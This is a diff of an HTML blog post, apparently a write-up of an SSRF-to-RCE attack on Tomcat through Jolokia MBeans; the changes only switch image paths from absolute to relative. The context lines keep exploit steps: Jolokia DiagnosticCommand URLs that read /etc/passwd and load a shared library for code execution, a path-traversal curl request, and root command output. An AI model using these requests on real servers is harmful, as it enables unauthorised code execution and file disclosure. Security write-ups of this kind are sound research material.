@@ -310,11 +310,11 @@ switch ($method) {
 
 <p>Clean normal request:</p>
 
-<p><img class="img_full" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/put-8443-clean.png" alt="put-8443-clean"></p>
+<p><img class="img_full" src="put-8443-clean.png" alt="put-8443-clean"></p>
 
 <p>SSRFed request: <strong>boom</strong></p>
 
-<p><img class="img_full" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/put-8443-boom.png" alt="put-8443-boom"></p>
+<p><img class="img_full" src="put-8443-boom.png" alt="put-8443-boom"></p>
 
 <p>Okey, that&rsquo;s a good start. The php server was (locally, test-purpose) a builtin one : <code>php -S 0.0.0.0:8443</code></p>
 
@@ -330,13 +330,13 @@ switch ($method) {
 
 <p>It&rsquo;s possible to login both locally and remotely, here we&rsquo;ll use the remote interface as our tomcat lives within a docker container.</p>
 
-<p><img class="img_med" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/jconsole-connect.png" alt="jconsole-connect"></p>
+<p><img class="img_med" src="jconsole-connect.png" alt="jconsole-connect"></p>
 
 <p>The Jconsole helps for resources monitoring, and also offers to to read and write attributes, as well as method calling with user-defined parameters.</p>
 
-<p><img class="img_full" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/jconsole-graph.png" alt="jconsole-graph"></p>
+<p><img class="img_full" src="jconsole-graph.png" alt="jconsole-graph"></p>
 
-<p><img class="img_full" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/jconsole-mbeans.png" alt="jconsole-mbeans"></p>
+<p><img class="img_full" src="jconsole-mbeans.png" alt="jconsole-mbeans"></p>
 
 <p>Pretty neat, pretty dangerous, but whatever, port 22222 isn&rsquo;t exposed&hellip;</p>
 
@@ -388,14 +388,14 @@ switch ($method) {
 
 <p>Locally, MBeans can be listed with <code>/jolokia/list</code> or with <code>jconsole</code>.</p>
 
-<p><img class="img_med" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/jolokia-list.png" alt="jolokia-list"></p>
+<p><img class="img_med" src="jolokia-list.png" alt="jolokia-list"></p>
 
 <ul>
 <li><p>Get help on the <code>DiagnosticCommand</code></p>
 
 <ul>
 <li><code>/jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*</code>
-<img class="img_full" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/jolokia-diagnostic-help.png" alt="jolokia-diagnostic-help"></li>
+<img class="img_full" src="jolokia-diagnostic-help.png" alt="jolokia-diagnostic-help"></li>
 <li>Notice that here, the <code>value</code> key is a string and not an array/dict, so we wouldn&rsquo;t be blind on the real target with the SSRF either!</li>
 </ul></li>
 
@@ -403,7 +403,7 @@ switch ($method) {
 
 <ul>
 <li><code>/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties</code>
-<img class="img_full" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/jolokia-diagnostic-vmproperties.png" alt="jolokia-diagnostic-vmproperties"></li>
+<img class="img_full" src="jolokia-diagnostic-vmproperties.png" alt="jolokia-diagnostic-vmproperties"></li>
 <li>Cool, now we have tomcat&rsquo;s absolute location</li>
 </ul></li>
 
@@ -419,7 +419,7 @@ switch ($method) {
 
 <ul>
 <li><code>/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd</code>
-<img class="img_full" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/jolokia-diagnostic-addCompiler.png" alt="jolokia-diagnostic-addCompiler"></li>
+<img class="img_full" src="jolokia-diagnostic-addCompiler.png" alt="jolokia-diagnostic-addCompiler"></li>
 <li>Could not load, here&rsquo;s its content, thanks for the fish! <em>facepalm</em></li>
 </ul></li>
 
@@ -427,7 +427,7 @@ switch ($method) {
 
 <ul>
 <li><code>/jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd</code>
-<img class="img_full" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/jolokia-diagnostic-jvmti.png" alt="jolokia-diagnostic-jvmti.png"></li>
+<img class="img_full" src="jolokia-diagnostic-jvmti.png" alt="jolokia-diagnostic-jvmti.png"></li>
 <li>For real? Load a .so with a simple GET request? Wow..</li>
 <li>Fun fact, there is no need to have a function called within the library. It is possible for both windows and linux to implement a constructor for the library and get code execution on dlopen this way!</li>
 </ul></li>
@@ -525,7 +525,7 @@ curl -i -k -X PUT 'http://0.0.0.0:8443/api.php?arg1=1&amp;arg2=global/../../../.
 # No type with name 'winuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 </code></pre>
 
-<p><img class="img_med" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/win-dance.gif" alt="win-dance"></p>
+<p><img class="img_med" src="win-dance.gif" alt="win-dance"></p>
 
 <h1 id="final-thoughts">Final thoughts</h1>
 
@@ -555,9 +555,9 @@ I spent so many nights reading and hacking with her by my side, exposing ideas a
 
 <p>Dear, I&rsquo;ll miss you. A lot.</p>
 
-<p><img class="img_med" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/choub-young.jpg" alt="choub-young"></p>
+<p><img class="img_med" src="choub-young.jpg" alt="choub-young"></p>
 
-<p><img class="img_med" src="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/choub-old.jpg" alt="choub-old"></p>
+<p><img class="img_med" src="choub-old.jpg" alt="choub-old"></p>
 
   </div>
   
